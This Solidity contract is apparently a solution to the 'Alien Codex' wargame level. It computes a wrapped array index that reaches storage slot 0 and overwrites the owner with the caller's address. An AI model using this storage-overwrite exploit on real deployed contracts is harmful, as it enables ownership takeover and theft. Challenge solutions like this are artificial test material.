pragma solidity ^0.8.0;

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
}

contract HackAlienCodex {
    function set(address _alienCodex) external {
        // 2 ** 256 = keccak256(slot(codex)) + index
        unchecked {
            uint index = uint256(2)**uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
            IAlienCodex(_alienCodex).revise(index, bytes32(uint256(uint160((msg.sender)))));
        }
    }
}